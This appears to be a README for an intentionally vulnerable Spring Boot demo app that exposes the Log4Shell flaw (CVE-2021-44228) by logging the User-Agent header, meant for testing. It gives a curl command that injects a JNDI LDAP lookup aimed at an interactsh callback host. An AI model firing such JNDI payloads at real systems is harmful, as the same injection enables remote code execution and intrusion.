# Simple Spring Boot application which is vulnerable to Log4Shell (CVE-2021-44228)
* Changed default logging framework from logback to log4j2

Application logs 'User-Agent' header, so one can test vulnerability with curl and e.g. [interactsh-service](https://github.com/projectdiscovery/interactsh):
```
curl -A '${jndi:ldap://interactsh-url/a}' http://target-service/
```
One should see DNS interaction at [app.interactsh.com](https://app.interactsh.com/).   

## Docker hub
Link to [Docker hub](https://hub.docker.com/r/korteke/log4shell-demo)
